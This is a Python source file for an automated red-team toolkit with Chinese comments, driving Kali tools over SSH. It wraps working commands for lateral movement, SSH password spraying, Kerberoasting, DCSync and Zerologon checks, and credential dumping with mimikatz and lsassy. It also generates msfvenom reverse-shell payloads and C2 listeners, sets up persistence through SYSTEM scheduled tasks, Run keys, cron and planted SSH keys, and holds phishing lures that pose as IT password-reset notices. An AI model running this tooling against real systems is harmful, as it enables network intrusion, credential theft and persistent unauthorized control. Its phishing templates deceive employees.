#!/usr/bin/env python3
"""
Red Team Toolkit — 红队全流程自动化

整合：内网横向、AD域渗透、社工钓鱼、C2对接、权限维持。
所有操作通过 KaliBridge SSH 执行。

用法:
    from kali_bridge import KaliBridge
    from redteam_toolkit import RedTeamToolkit
    kb = KaliBridge(config)
    rt = RedTeamToolkit(kb)
    rt.lateral.psexec("10.0.0.5", "admin", "hash")
    rt.ad.kerberoast("dc01", "corp.local", "user", "pass")
    rt.phish.generate_email("victim@corp.com", "IT")
    rt.creds.mimikatz("10.0.0.5", "admin", "pass")
    rt.c2.msf_listener("10.0.0.1", 4444)
"""

class LateralMovement:
    def __init__(s, kb): s.kb = kb
    def psexec(s, t, u, h, d=""): return s.kb.run(f"impacket-psexec {d+'/' if d else ''}{u}@{t} -hashes :{h} 'whoami'|head -20" if len(h)==32 or ':' in h else f"impacket-psexec {u}:{h}@{t} 'whoami'|head -20")
    def wmiexec(s, t, u, p, cmd="whoami", d=""): return s.kb.run(f"impacket-wmiexec {d+'/' if d else ''}{u}:{p}@{t} '{cmd}'|head -20")
    def winrm(s, t, u, p, cmd="whoami"): return s.kb.run(f"evil-winrm -i {t} -u {u} -p '{p}' -c '{cmd}'|head -20", timeout=30)
    def scan_alive(s, subnet): return s.kb.run(f"nmap -sn {subnet} -oG -|grep Up|awk '{{print $2}}'", timeout=60)
    def scan_smb(s, subnet): return s.kb.run(f"nmap -p 445 --open {subnet} -oG -|grep open|awk '{{print $2}}'", timeout=120)
    def ssh_spray(s, targets, users, passwords):
        t="\\n".join(targets if isinstance(targets,list) else [targets])
        u="\\n".join(users); p="\\n".join(passwords)
        return s.kb.run(f"echo -e '{t}'>/tmp/t.txt&&echo -e '{u}'>/tmp/u.txt&&echo -e '{p}'>/tmp/p.txt&&hydra -L /tmp/u.txt -P /tmp/p.txt -M /tmp/t.txt ssh -t 2 -f|grep success|head -20", timeout=300)

class ADAttack:
    def __init__(s, kb): s.kb = kb
    def kerberoast(s, dc, domain, user, pw): return s.kb.run(f"impacket-GetUserSPNs {domain}/{user}:{pw} -dc-ip {dc} -request", timeout=60)
    def asreproast(s, dc, domain, ufile="/tmp/users.txt"): return s.kb.run(f"impacket-GetNPUsers {domain}/ -dc-ip {dc} -usersfile {ufile} -no-pass -format hashcat", timeout=60)
    def dcsync(s, dc, domain, user, cred): return s.kb.run(f"impacket-secretsdump {domain}/{user}:{cred}@{dc} -just-dc|head -50", timeout=120)
    def bloodhound(s, dc, domain, u, p): return s.kb.run(f"bloodhound-python -c All -d {domain} -u {u} -p '{p}' -dc {dc} -ns {dc}", timeout=180)
    def enum_users(s, dc): return s.kb.run(f"crackmapexec smb {dc} -u '' -p '' --users|head -50", timeout=60)
    def enum_shares(s, dc, u, p): return s.kb.run(f"crackmapexec smb {dc} -u {u} -p '{p}' --shares", timeout=60)
    def zerologon(s, dc): return s.kb.run(f"crackmapexec smb {dc} -u '' -p '' -M zerologon", timeout=30)

class PhishingKit:
    def __init__(s, kb): s.kb = kb
    def generate_email(s, target, dept="IT", company="公司", body_type="password_reset"):
        templates = {
            "password_reset": {"subject": f"【{company}】密码即将过期", "body": f"尊敬的{dept}部同事：\n\n您的密码将于24小时后过期。请点击链接更新：\n\n[更新密码]({{{{link}}}})\n\n{company} IT部"},
            "document": {"subject": f"【{company}】{dept}部 - 文档待审阅", "body": f"Hi，\n\n{dept}部分享了文档给您：\n\n[查看文档]({{{{link}}}})\n\n请今日内查看。"},
            "security": {"subject": f"【安全警告】异常登录 - {company}", "body": f"检测到异常登录。如非本人操作：\n\n[立即处理]({{{{link}}}})\n\n{company} 安全团队"},
        }
        t = templates.get(body_type, templates["password_reset"])
        return {"to": target, **t, "note": "替换{{link}}为钓鱼页面"}
    def gen_payload(s, lhost, lport=4444, fmt="hta"):
        fmts = {"hta":"hta-psh","exe":"exe","ps1":"psh","macro":"vba-psh","elf":"elf"}
        f = fmts.get(fmt, "hta-psh")
        p = "windows/meterpreter/reverse_tcp" if fmt != "elf" else "linux/x64/meterpreter/reverse_tcp"
        return s.kb.run(f"msfvenom -p {p} LHOST={lhost} LPORT={lport} -f {f} -o /tmp/payload.{fmt}", timeout=60)
    def clone_page(s, url): return s.kb.run(f"wget --mirror --convert-links -P /tmp/phish {url}|tail -5", timeout=60)

class CredHarvest:
    def __init__(s, kb): s.kb = kb
    def mimikatz(s, t, u, p): return s.kb.run(f"crackmapexec smb {t} -u {u} -p '{p}' -M mimikatz|head -30", timeout=60)
    def hashdump(s, t, u, p): return s.kb.run(f"impacket-secretsdump {u}:{p}@{t}|head -30", timeout=60)
    def lsass(s, t, u, p): return s.kb.run(f"crackmapexec smb {t} -u {u} -p '{p}' -M lsassy|head -30", timeout=60)
    def crack(s, hfile, wl="/usr/share/wordlists/rockyou.txt", mode=1000): return s.kb.run(f"hashcat -m {mode} {hfile} {wl} --force|tail -20", timeout=600)

class C2Integration:
    def __init__(s, kb): s.kb = kb
    def msf_listener(s, lhost, lport=4444, payload="windows/meterpreter/reverse_tcp"):
        return s.kb.run(f'msfconsole -qx "use multi/handler;set payload {payload};set LHOST {lhost};set LPORT {lport};exploit -j"|tail -10', timeout=30)
    def sliver_gen(s, lhost, lport=443, os_t="windows"):
        return s.kb.run(f"sliver-client generate --mtls {lhost}:{lport} --os {os_t} --save /tmp/implant", timeout=120)
    def sliver_listen(s, lhost, lport=443):
        return s.kb.run(f"sliver-client mtls -l {lhost} -L {lport}", timeout=10)

class Persistence:
    def __init__(s, kb): s.kb = kb
    def schtask(s, t, u, p, name="Update", exe="c:\\\\temp\\\\p.exe"):
        return s.kb.run(f'impacket-atexec {u}:{p}@{t} "schtasks /create /tn {name} /tr {exe} /sc minute /mo 30 /ru SYSTEM"', timeout=30)
    def registry(s, t, u, p, exe="c:\\\\temp\\\\p.exe"):
        return s.kb.run(f'impacket-wmiexec {u}:{p}@{t} \'reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Upd /d "{exe}" /f\'', timeout=30)
    def cron(s, t, u, p, cmd="/tmp/p", sched="*/30 * * * *"):
        return s.kb.run(f"sshpass -p '{p}' ssh {u}@{t} '(crontab -l;echo \"{sched} {cmd}\")|crontab -'", timeout=15)
    def ssh_key(s, t, u, p):
        key = s.kb.run("cat ~/.ssh/id_rsa.pub").get("output","").strip()
        return s.kb.run(f"sshpass -p '{p}' ssh {u}@{t} 'mkdir -p ~/.ssh&&echo \"{key}\">>~/.ssh/authorized_keys'", timeout=15)

class RedTeamToolkit:
    def __init__(s, kb, config=None):
        s.kb = kb; s.config = config or {}
        s.lateral = LateralMovement(kb)
        s.ad = ADAttack(kb)
        s.phish = PhishingKit(kb)
        s.creds = CredHarvest(kb)
        s.c2 = C2Integration(kb)
        s.persist = Persistence(kb)

    def hw_chain(s, subnet, dc="", domain="", user="", pw=""):
        """HW一条龙: 扫描→喷洒→横向→域控"""
        r = []
        r.append(("存活", s.lateral.scan_alive(subnet)))
        r.append(("SMB", s.lateral.scan_smb(subnet)))
        if user and pw:
            r.append(("CME", s.kb.crackmapexec(subnet, "smb", user, pw)))
            if dc and domain:
                r.append(("Kerberoast", s.ad.kerberoast(dc, domain, user, pw)))
        return r
